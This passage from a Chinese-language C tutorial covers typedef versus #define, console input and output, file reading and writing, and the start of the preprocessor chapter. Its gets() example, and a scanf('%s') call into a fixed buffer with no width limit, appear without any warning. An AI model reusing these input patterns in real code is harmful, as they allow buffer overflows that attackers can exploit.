class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span>   book_id;</span><br><span class="line">&#125; Book;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   Book book;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">strcpy</span>( book.title, <span class="string">"C 教程"</span>);</span><br><span class="line">   <span class="built_in">strcpy</span>( book.author, <span class="string">"Runoob"</span>); </span><br><span class="line">   <span class="built_in">strcpy</span>( book.subject, <span class="string">"编程语言"</span>);</span><br><span class="line">   book.book_id = <span class="number">12345</span>;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"书标题 : %s\n"</span>, book.title);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"书作者 : %s\n"</span>, book.author);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"书类目 : %s\n"</span>, book.subject);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"书 ID : %d\n"</span>, book.book_id);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">书标题 : C 教程</span><br><span class="line">书作者 : Runoob</span><br><span class="line">书类目 : 编程语言</span><br><span class="line">书 ID : <span class="number">12345</span></span><br></pre></td></tr></table></figure><h3 id="typedef-vs-define"><a href="#typedef-vs-define" class="headerlink" title="typedef vs #define"></a>typedef vs #define</h3><p><strong>#define</strong> 是 C 指令，用于为各种数据类型定义别名，与 <strong>typedef</strong> 类似，但是它们有以下几点不同：</p><ul><li><strong>typedef</strong> 仅限于为类型定义符号名称，<strong>#define</strong> 不仅可以为类型定义别名，也能为数值定义别名，比如您可以定义 1 为 ONE。</li><li><strong>typedef</strong> 是由编译器执行解释的，<strong>#define</strong> 语句是由预编译器进行处理的。</li></ul><p>下面是 #define 的最简单的用法：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> TRUE  1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FALSE 0</span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"TRUE 的值: %d\n"</span>, TRUE);</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"FALSE 的值: %d\n"</span>, FALSE);</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TRUE 的值: <span class="number">1</span></span><br><span class="line">FALSE 的值: <span class="number">0</span></span><br></pre></td></tr></table></figure><h2 id="C-输入-amp-输出"><a href="#C-输入-amp-输出" class="headerlink" title="C    输入 &amp; 输出"></a>C    输入 &amp; 输出</h2><p>当我们提到<strong>输入</strong>时，这意味着要向程序填充一些数据。输入可以是以文件的形式或从命令行中进行。C 语言提供了一系列内置的函数来读取给定的输入，并根据需要填充到程序中。</p><p>当我们提到<strong>输出</strong>时，这意味着要在屏幕上、打印机上或任意文件中显示一些数据。C 语言提供了一系列内置的函数来输出数据到计算机屏幕上和保存数据到文本文件或二进制文件中。</p><h3 id="标准文件"><a href="#标准文件" class="headerlink" title="标准文件"></a>标准文件</h3><p>C 语言把所有的设备都当作文件。所以设备（比如显示器）被处理的方式与文件相同。以下三个文件会在程序执行时自动打开，以便访问键盘和屏幕。</p><table><thead><tr><th align="left">标准文件</th><th align="left">文件指针</th><th align="left">设备</th></tr></thead><tbody><tr><td align="left">标准输入</td><td align="left">stdin</td><td align="left">键盘</td></tr><tr><td align="left">标准输出</td><td align="left">stdout</td><td align="left">屏幕</td></tr><tr><td align="left">标准错误</td><td align="left">stderr</td><td align="left">您的屏幕</td></tr></tbody></table><p>文件指针是访问文件的方式，本节将讲解如何从屏幕读取值以及如何把结果输出到屏幕上。</p><p>C 语言中的 I/O (输入/输出) 通常使用 printf() 和 scanf() 两个函数。</p><p>scanf() 函数用于从标准输入（键盘）读取并格式化， printf() 函数发送格式化输出到标准输出（屏幕）。</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;      // 执行 printf() 函数需要该库</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"菜鸟教程"</span>);  <span class="comment">//显示引号中的内容</span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译以上程序，输出结果为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">菜鸟教程</span><br></pre></td></tr></table></figure><p><strong>实例解析：</strong></p><ul><li>所有的 C 语言程序都需要包含 <strong>main()</strong> 函数。 代码从 <strong>main()</strong> 函数开始执行。</li><li><strong>printf()</strong> 用于格式化输出到屏幕。<strong>printf()</strong> 函数在 <strong>“stdio.h”</strong> 头文件中声明。</li><li><strong>stdio.h</strong> 是一个头文件 (标准输入输出头文件) and <strong>#include</strong> 是一个预处理命令，用来引入头文件。 当编译器遇到 <strong>printf()</strong> 函数时，如果没有找到 <strong>stdio.h</strong> 头文件，会发生编译错误。</li><li><strong>return 0;</strong> 语句用于表示退出程序。</li></ul><p><strong>%d 格式化输出整数</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> testInteger = <span class="number">5</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Number = %d"</span>, testInteger);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译以上程序，输出结果为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Number = <span class="number">5</span></span><br></pre></td></tr></table></figure><p> 在 printf() 函数的引号中使用 “%d” (整型) 来匹配整型变量 testInteger 并输出到屏幕。 </p><p><strong>%f 格式化输出浮点型数据</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">float</span> f;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Enter a number: "</span>);</span><br><span class="line">    <span class="comment">// %f 匹配浮点型数据</span></span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%f"</span>,&amp;f);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Value = %f"</span>, f);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="getchar-amp-putchar-函数"><a href="#getchar-amp-putchar-函数" class="headerlink" title="getchar() &amp; putchar() 函数"></a>getchar() &amp; putchar() 函数</h3><p><strong>int getchar(void)</strong> 函数从屏幕读取下一个可用的字符，并把它返回为一个整数。这个函数在同一个时间内只会读取一个单一的字符。您可以在循环内使用这个方法，以便从屏幕上读取多个字符。</p><p><strong>int putchar(int c)</strong> 函数把字符输出到屏幕上，并返回相同的字符。这个函数在同一个时间内只会输出一个单一的字符。您可以在循环内使用这个方法，以便在屏幕上输出多个字符。</p><p>请看下面的实例：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">int</span> c;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Enter a value :"</span>);</span><br><span class="line">   c = getchar( );</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"\nYou entered: "</span>);</span><br><span class="line">   <span class="built_in">putchar</span>( c );</span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"\n"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并只会读取一个单一的字符，显示如下： </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./a.out</span><br><span class="line">Enter a value :runoob</span><br><span class="line"></span><br><span class="line">You entered: r</span><br></pre></td></tr></table></figure><h3 id="gets-amp-puts-函数"><a href="#gets-amp-puts-函数" class="headerlink" title="gets() &amp; puts() 函数"></a>gets() &amp; puts() 函数</h3><p><strong>char *gets(char *s)</strong> 函数从 <strong>stdin</strong> 读取一行到 <strong>s</strong> 所指向的缓冲区，直到一个终止符或 EOF。</p><p><strong>int puts(const char *s)</strong> 函数把字符串 s 和一个尾随的换行符写入到 <strong>stdout</strong>。</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Enter a value :"</span>);</span><br><span class="line">   gets( str );</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"\nYou entered: "</span>);</span><br><span class="line">   <span class="built_in">puts</span>( str );</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并读取一整行直到该行结束，显示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./a.out</span><br><span class="line">Enter a value :runoob</span><br><span class="line"></span><br><span class="line">You entered: runoob</span><br></pre></td></tr></table></figure><h3 id="scanf-和-printf-函数"><a href="#scanf-和-printf-函数" class="headerlink" title="scanf() 和 printf() 函数"></a>scanf() 和 printf() 函数</h3><p><strong>int scanf(const char *format, …)</strong> 函数从标准输入流 <strong>stdin</strong> 读取输入，并根据提供的 <strong>format</strong> 来浏览输入。</p><p><strong>int printf(const char *format, …)</strong> 函数把输出写入到标准输出流 <strong>stdout</strong> ，并根据提供的格式产生输出。</p><p><strong>format</strong> 可以是一个简单的常量字符串，但是您可以分别指定 %s、%d、%c、%f 等来输出或读取字符串、整数、字符或浮点数。还有许多其他可用的格式选项，可以根据需要使用。如需了解完整的细节，可以查看这些函数的参考手册。现在让我们通过下面这个简单的实例来加深理解：</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( )</span> </span>&#123;</span><br><span class="line"> </span><br><span class="line">   <span class="keyword">char</span> str[<span class="number">100</span>];</span><br><span class="line">   <span class="keyword">int</span> i;</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"Enter a value :"</span>);</span><br><span class="line">   <span class="built_in">scanf</span>(<span class="string">"%s %d"</span>, str, &amp;i);</span><br><span class="line"> </span><br><span class="line">   <span class="built_in">printf</span>( <span class="string">"\nYou entered: %s %d "</span>, str, i);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会等待您输入一些文本，当您输入一个文本并按下回车键时，程序会继续并读取输入，显示如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$./a.out</span><br><span class="line">Enter a value :runoob <span class="number">123</span></span><br><span class="line"></span><br><span class="line">You entered: runoob <span class="number">123</span></span><br></pre></td></tr></table></figure><p> 在这里，应当指出的是，scanf() 期待输入的格式与您给出的 %s 和 %d 相同，这意味着您必须提供有效的输入，比如 “string integer”，如果您提供的是 “string string” 或 “integer integer”，它会被认为是错误的输入。另外，在读取字符串时，只要遇到一个空格，scanf() 就会停止读取，所以 “this is test” 对 scanf() 来说是三个字符串。 </p><h2 id="C-文件读写"><a href="#C-文件读写" class="headerlink" title="C    文件读写"></a>C    文件读写</h2><p>上一章我们讲解了 C 语言处理的标准输入和输出设备。本章我们将介绍 C 程序员如何创建、打开、关闭文本文件或二进制文件。</p><p>一个文件，无论它是文本文件还是二进制文件，都是代表了一系列的字节。C 语言不仅提供了访问顶层的函数，也提供了底层（OS）调用来处理存储设备上的文件。本章将讲解文件管理的重要调用。</p><h3 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h3><p>您可以使用 <strong>fopen( )</strong> 函数来创建一个新的文件或者打开一个已有的文件，这个调用会初始化类型 <strong>FILE</strong> 的一个对象，类型 <strong>FILE</strong> 包含了所有用来控制流的必要的信息。下面是这个函数调用的原型：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">FILE *<span class="title">fopen</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> * filename, <span class="keyword">const</span> <span class="keyword">char</span> * mode )</span></span>;</span><br></pre></td></tr></table></figure><p>在这里，<strong>filename</strong> 是字符串，用来命名文件，访问模式 <strong>mode</strong> 的值可以是下列值中的一个：</p><table><thead><tr><th align="left">模式</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">r</td><td align="left">打开一个已有的文本文件，允许读取文件。</td></tr><tr><td align="left">w</td><td align="left">打开一个文本文件，允许写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会从文件的开头写入内容。如果文件存在，则该会被截断为零长度，重新写入。</td></tr><tr><td align="left">a</td><td align="left">打开一个文本文件，以追加模式写入文件。如果文件不存在，则会创建一个新文件。在这里，您的程序会在已有的文件内容中追加内容。</td></tr><tr><td align="left">r+</td><td align="left">打开一个文本文件，允许读写文件。</td></tr><tr><td align="left">w+</td><td align="left">打开一个文本文件，允许读写文件。如果文件已存在，则文件会被截断为零长度，如果文件不存在，则会创建一个新文件。</td></tr><tr><td align="left">a+</td><td align="left">打开一个文本文件，允许读写文件。如果文件不存在，则会创建一个新文件。读取会从文件的开头开始，写入则只能是追加模式。</td></tr></tbody></table><p>如果处理的是二进制文件，则需使用下面的访问模式来取代上面的访问模式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"rb"</span>, <span class="string">"wb"</span>, <span class="string">"ab"</span>, <span class="string">"rb+"</span>, <span class="string">"r+b"</span>, <span class="string">"wb+"</span>, <span class="string">"w+b"</span>, <span class="string">"ab+"</span>, <span class="string">"a+b"</span></span><br></pre></td></tr></table></figure><h3 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h3><p>为了关闭文件，请使用 fclose( ) 函数。函数的原型如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fclose</span><span class="params">( FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>如果成功关闭文件，<strong>fclose( )</strong> 函数返回零，如果关闭文件时发生错误，函数返回 <strong>EOF</strong>。这个函数实际上，会清空缓冲区中的数据，关闭文件，并释放用于该文件的所有内存。EOF 是一个定义在头文件 <strong>stdio.h</strong> 中的常量。</p><p>C 标准库提供了各种函数来按字符或者以固定长度字符串的形式读写文件。</p><h3 id="写入文件"><a href="#写入文件" class="headerlink" title="写入文件"></a>写入文件</h3><p>下面是把字符写入到流中的最简单的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fputc</span><span class="params">( <span class="keyword">int</span> c, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>函数 <strong>fputc()</strong> 把参数 c 的字符值写入到 fp 所指向的输出流中。如果写入成功，它会返回写入的字符，如果发生错误，则会返回 <strong>EOF</strong>。您可以使用下面的函数来把一个以 null 结尾的字符串写入到流中：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fputs</span><span class="params">( <span class="keyword">const</span> <span class="keyword">char</span> *s, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>函数 <strong>fputs()</strong> 把字符串 <strong>s</strong> 写入到 fp 所指向的输出流中。如果写入成功，它会返回一个非负值，如果发生错误，则会返回 <strong>EOF</strong>。您也可以使用 <strong>int fprintf(FILE *fp,const char *format, …)</strong> 函数来写把一个字符串写入到文件中。尝试下面的实例：</p><blockquote><p><strong>注意：</strong>请确保您有可用的 <strong>tmp</strong> 目录，如果不存在该目录，则需要在您的计算机上先创建该目录。</p><p><strong>/tmp</strong> 一般是 Linux 系统上的临时目录，如果你在 Windows 系统上运行，则需要修改为本地环境中已存在的目录，例如: <strong>C:\tmp</strong>、<strong>D:\tmp</strong>等。</p></blockquote><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">"/tmp/test.txt"</span>, <span class="string">"w+"</span>);</span><br><span class="line">   <span class="built_in">fprintf</span>(fp, <span class="string">"This is testing for fprintf...\n"</span>);</span><br><span class="line">   <span class="built_in">fputs</span>(<span class="string">"This is testing for fputs...\n"</span>, fp);</span><br><span class="line">   fclose(fp);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> 当上面的代码被编译和执行时，它会在 /tmp 目录中创建一个新的文件 <strong>test.txt</strong>，并使用两个不同的函数写入两行。接下来让我们来读取这个文件。 </p><h3 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h3><p>下面是从文件读取单个字符的最简单的函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">fgetc</span><span class="params">( FILE * fp )</span></span>;</span><br></pre></td></tr></table></figure><p><strong>fgetc()</strong> 函数从 fp 所指向的输入文件中读取一个字符。返回值是读取的字符，如果发生错误则返回 <strong>EOF</strong>。下面的函数允许您从流中读取一个字符串：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">char</span> *<span class="title">fgets</span><span class="params">( <span class="keyword">char</span> *buf, <span class="keyword">int</span> n, FILE *fp )</span></span>;</span><br></pre></td></tr></table></figure><p>函数 <strong>fgets()</strong> 从 fp 所指向的输入流中读取 n - 1 个字符。它会把读取的字符串复制到缓冲区 <strong>buf</strong>，并在最后追加一个 <strong>null</strong> 字符来终止字符串。</p><p>如果这个函数在读取最后一个字符之前就遇到一个换行符 ‘\n’ 或文件的末尾 EOF，则只会返回读取到的字符，包括换行符。您也可以使用 <strong>int fscanf(FILE *fp, const char *format, …)</strong> 函数来从文件中读取字符串，但是在遇到第一个空格字符时，它会停止读取。</p><p><strong>实例</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">   FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">   <span class="keyword">char</span> buff[<span class="number">255</span>];</span><br><span class="line"> </span><br><span class="line">   fp = fopen(<span class="string">"/tmp/test.txt"</span>, <span class="string">"r"</span>);</span><br><span class="line">   <span class="built_in">fscanf</span>(fp, <span class="string">"%s"</span>, buff);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"1: %s\n"</span>, buff );</span><br><span class="line"> </span><br><span class="line">   fgets(buff, <span class="number">255</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"2: %s\n"</span>, buff );</span><br><span class="line">   </span><br><span class="line">   fgets(buff, <span class="number">255</span>, (FILE*)fp);</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">"3: %s\n"</span>, buff );</span><br><span class="line">   fclose(fp);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当上面的代码被编译和执行时，它会读取上一部分创建的文件，产生下列结果：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: This</span><br><span class="line"><span class="number">2</span>: is testing <span class="keyword">for</span> <span class="built_in">fprintf</span>...</span><br><span class="line"></span><br><span class="line"><span class="number">3</span>: This is testing <span class="keyword">for</span> <span class="built_in">fputs</span>...</span><br></pre></td></tr></table></figure><p> 首先，<strong>fscanf()</strong> 方法只读取了 <strong>This</strong>，因为它在后边遇到了一个空格。其次，调用 <strong>fgets()</strong> 读取剩余的部分，直到行尾。最后，调用 <strong>fgets()</strong> 完整地读取第二行。 </p><h3 id="二进制-I-O-函数"><a href="#二进制-I-O-函数" class="headerlink" title="二进制 I/O 函数"></a>二进制 I/O 函数</h3><p>下面两个函数用于二进制输入和输出：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">size_t</span> fread(<span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size_of_elements, </span><br><span class="line">             <span class="keyword">size_t</span> number_of_elements, FILE *a_file);</span><br><span class="line">              </span><br><span class="line"><span class="keyword">size_t</span> fwrite(<span class="keyword">const</span> <span class="keyword">void</span> *ptr, <span class="keyword">size_t</span> size_of_elements, </span><br><span class="line">             <span class="keyword">size_t</span> number_of_elements, FILE *a_file);</span><br></pre></td></tr></table></figure><p> 这两个函数都是用于存储块的读写 - 通常是数组或结构体。 </p><h2 id="C-预处理器"><a href="#C-预处理器" class="headerlink" title="C    预处理器"></a>C    预处理器</h2><p><strong>C 预处理器</strong>不是编译器的组成部分，但是它是编译过程中一个单独的步骤。简言之，C 预处理器只不过是一个文本替换工具而已，它们会指示编译器在实际编译之前完成所需的预处理。我们将把 C 预处理器（C Preprocessor）简写为 CPP。</p><p>所有的预处理器命令都是以井号（#）开头。它必须是第一个非空字符，为了增强可读性，预处理器指令应从第一列开始。下面列出了所有重要的预处理器指令：</p><table><thead><tr><th align="left">指令</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">#define</td><td align="left">定义宏</td></tr><tr><td align="left">#include</td><td align="left">包含一个源代码文件</td></tr><tr><td align="left">#undef</td><td align="left">取消已定义的宏</td></tr><tr><td align="left">#ifdef</td><td align="left">如果宏已经定义，则返回真</td></tr><tr><td align="left">#ifndef</td><td align="left">如果宏没有定义，则返回真</td></tr><tr><td align="left">#if</td><td align="left">如果给定条件为真，则编译下面代码</td></tr><tr><td align="left">#else</td><td align="left">#if 的替代方案</td></tr><tr><td align="left">#elif</td><td align="left">如果前面的 #if 给定条件不为真，当前条件为真，则编译下面代码</td></tr><tr><td align="left">#endif</td><td align="left">结束一个 #if……#else 条件编译块</td></tr><tr><td align="left">#error</td><td align="left">当遇到标准错误时，输出错误消息</td></tr><tr><td align="left">#pragma</td><td align="left">使用标准化方法，向编译器发布特殊的命令到编译器中</td></tr></tbody></table><h3 id="预处理器实例"><a href="#预处理器实例" class="headerlink" title="预处理器实例"></a>预处理器实例</h3><p>分析下面的实例来理解不同的指令。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_ARRAY_LENGTH 20</span></span><br></pre></td></tr></table></figure><p>这个指令告诉 CPP 把所有的 MAX_ARRAY_LENGTH 替换为 20。使用 <em>#define</em> 定义常量来增强可读性。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"myheader.h"</span></span></span><br></pre></td></tr></table></figure><p> 这些指令告诉 CPP 从<strong>系统库</strong>中获取 stdio.h，并添加文本到当前的源文件中。下一行告诉 CPP 从本地目录中获取 <strong>myheader.h</strong>，并添加内容到当前的源文件中。 </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td 